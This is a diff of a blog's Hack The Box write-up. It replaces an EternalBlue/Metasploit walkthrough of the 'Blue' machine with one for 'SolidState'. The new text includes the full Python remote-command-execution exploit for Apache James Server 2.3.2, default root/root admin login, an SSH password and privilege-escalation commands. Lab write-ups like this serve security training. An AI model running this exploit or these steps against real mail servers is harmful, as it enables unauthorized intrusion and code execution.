@@ -54,72 +54,171 @@ editPost:
 
 Other room, other port scan.
 
-I found 2 open ports for samba service 139 and 445 and the other ones are for msrpc. Let’s focus on samba.
+- As always:
+	
+	```bash
+	 sudo nmap -p- --open -sCV -sS --min-rate 5000 -vvv -n -Pn 10.10.10.51 -oN escaneo
+	```
+![Untitled](/HTB/nmap-solidstate.png)
+
+I found 5 open ports 22(tcp), 25(smtp James Server), 80(http), 110(pop3 James Server), 119(nntp James Server).
 
 ## Enumeration
 
-I am going to enumerate the possible vulnerabilities with `sudo nmap 10.10.10.14 -p 139,445 --script=vuln` 
+As always I first do a scan with `whatweb 10.10.10.51`, but on this case it throws me nothing relevant. So next,
+I tried to do a scan of posible directories, and nothing relevant to. I tried to do a very intensive research becaus 
+the last machine I did, I spent a lot of time for this reason. In this case I can say that there's aparently
+nothing vulnerable.
 
-```bash
-Host script results:
-|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
-| smb-vuln-ms17-010:
-|   VULNERABLE:
-|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
-|     State: VULNERABLE
-|     IDs:  CVE:CVE-2017-0143
-|     Risk factor: HIGH
-|       A critical remote code execution vulnerability exists in Microsoft SMBv1
-|        servers (ms17-010).
-|
-|     Disclosure date: 2017-03-14
-|     References:
-|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
-|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
-|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
-|_smb-vuln-ms10-054: false
-```
-
-We have a eternal blue vulnerability MS17-010 (CVE-2017-0143) which gives us RCE in the Microsoft Samba services that are vulnerable, this time I am going to use metasploit to exploit it.
 
 ## Exploiting
 
-![Untitled](/HTB/blue-1.png)
+So after all of the above, I started looking for information about the remaining ports and discovered that there 
+were different ways to obtain information by using `nc` or `telnet`.
 
-Upon started metasploit we got that search results, the second one fits well in this situation. I am going to set the Remote Host and the Local Host as any metasploit exploit and then running it.
+![Untitled](/HTB/119-solidstate.png)
+
+It took me a bit longer to set up this machine since port 4555 wasn't displayed in my nmap analysis, but eventually, I realized that it was indeed open. 
+It was thanks to this that I managed to hack into the machine, as I read online that there was a possibility of 
+being able to log in with root/root. 
+
+![Untitled](/HTB/110-solidstate.png)
+
+After this, I was able to modify the passwords for all the email users and 
+thus connect to port 110 with telnet using mindy/platano. Following that, I started investigating Mindy's emails 
+and found one containing some credentials, which allowed me to connect via SSH to the user mindy.
+
+![Untitled](/HTB/pass-solidstate.png)
+
+Initially, I had a bit of trouble with the bash shell when working with the mindy user, but later I found two ways to overcome 
+it: with an exploit that I will provide below, and with `sshpass -p 'P@55W0rd1!2@' ssh mindy@10.10.10.51 bash`.
+
+```bash
+ #!/usr/bin/python
+ #
+ # Exploit Title: Apache James Server 2.3.2 Authenticated User Remote Command Execution
+ # Date: 16\10\2014
+ # Exploit Author: Jakub Palaczynski, Marcin Woloszyn, Maciej Grabiec
+ # Vendor Homepage: http://james.apache.org/server/
+ # Software Link: http://ftp.ps.pl/pub/apache/james/server/apache-james-2.3.2.zip
+ # Version: Apache James Server 2.3.2
+ # Tested on: Ubuntu, Debian
+ # Info: This exploit works on default installation of Apache James Server 2.3.2
+ # Info: Example paths that will automatically execute payload on some action: /etc/bash_completion.d , /etc/pm/config.d
+
+ import socket
+ import sys
+ import time
+
+ # specify payload
+ #payload = 'touch /tmp/proof.txt' # to exploit on any user 
+ payload = '[ "$(id -u)" == "0" ] && touch /root/proof.txt' # to exploit only on root
+ # credentials to James Remote Administration Tool (Default - root/root)
+ user = 'root'
+ pwd = 'root'
+
+ if len(sys.argv) != 2:
+    sys.stderr.write("[-]Usage: python %s <ip>\n" % sys.argv[0])
+    sys.stderr.write("[-]Exemple: python %s 127.0.0.1\n" % sys.argv[0])
+    sys.exit(1)
+
+ ip = sys.argv[1]
+
+ def recv(s):
+        s.recv(1024)
+        time.sleep(0.2)
+
+ try:
+    print "[+]Connecting to James Remote Administration Tool..."
+    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.connect((ip,4555))
+    s.recv(1024)
+    s.send(user + "\n")
+    s.recv(1024)
+    s.send(pwd + "\n")
+    s.recv(1024)
+    print "[+]Creating user..."
+    s.send("adduser ../../../../../../../../etc/bash_completion.d exploit\n")
+    s.recv(1024)
+    s.send("quit\n")
+    s.close()
+
+    print "[+]Connecting to James SMTP server..."
+    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.connect((ip,25))
+    s.send("ehlo team@team.pl\r\n")
+    recv(s)
+    print "[+]Sending payload..."
+    s.send("mail from: <'@team.pl>\r\n")
+    recv(s)
+    # also try s.send("rcpt to: <../../../../../../../../etc/bash_completion.d@hostname>\r\n") if the recipient cannot be found
+    s.send("rcpt to: <../../../../../../../../etc/bash_completion.d>\r\n")
+    recv(s)
+    s.send("data\r\n")
+    recv(s)
+    s.send("From: team@team.pl\r\n")
+    s.send("\r\n")
+    s.send("'\n")
+    s.send(payload + "\n")
+    s.send("\r\n.\r\n")
+    recv(s)
+    s.send("quit\r\n")
+    recv(s)
+    s.close()
+    print "[+]Done! Payload will be executed once somebody logs in."
+ except:
+    print "Connection failed."
+
+```
+
+![Untitled](/HTB/mindy-solidstate.png)
+
+![Untitled](/HTB/casiroot-solidstate.png)
+
+The machine is pawned :) !!!
+
+## TTY Treatment
+
+```bash
+ script /dev/null -c bash
+ ctrl + z
+ stty raw -echo; fg
+ restet xterm
+ export TERM=xterm
+```
 
 ## Gaining an Initial Foothold
 
-We are in now
+We are in now so, as always I do:
 
-![Untitled](/HTB/blue-5.png)
+```bash
+ sudo -l
+ cat /etc/crontab
+ find / -perm -4000 2>/dev/null
+ find / -type f -writable 2>/dev/null
+ bash procmon.sh
+ lsb_release -a
+ uname -a
+ id
+ getcap -r / 2>/dev/null
+ ...
+```
+At first I started to get frustrated because trying with procmon.sh and doing a `cat /etc/hosts` I didn't get 
+any curious process. But when I did a `find / -type f -writable 2>/dev/null` I found that there was a 
+file in the temporary directory and it was running every 1 minitu so I got on with it.
 
-We can’t use the dir and whoami command, but my intuition tells me that we are privileged users.
+![Untitled](/HTB/root-solidstate.png)
 
-![Untitled](/HTB/blue-4.png)
+All that's left to do is `bash -p`.
 
-![Untitled](/HTB/blue-2.png)
-
-Let’s find ourselves the directory, If we go to the root directory C:\ we can find users directory and inside there are two interesting users the Administrator and haris. In his desktops there are the flags.
-
-We are privilaged users, my intuition has not failed.
-
-## Flags
-
-**User Flag**
-
-![Untitled](/HTB/blue-6.png)
-
-**Root Flag**
-
-![Untitled](/HTB/blue-7.png)
+And was root !!!
 
 ## Lessons Learned
 
 - What insights did you gain from the room?
     
-    It’s pretty similar to the legacy room, so I tried to replicate the methodology but with metasploit this time.
+    I learned about the James Server and ports 25, 119 and 4555.
     
 - Were there any novel tools or techniques employed?
     
-    The use of metasploit and meterpreter helps me a lot to exploit easily this vulnerability.
+    The the methodology of these ports.
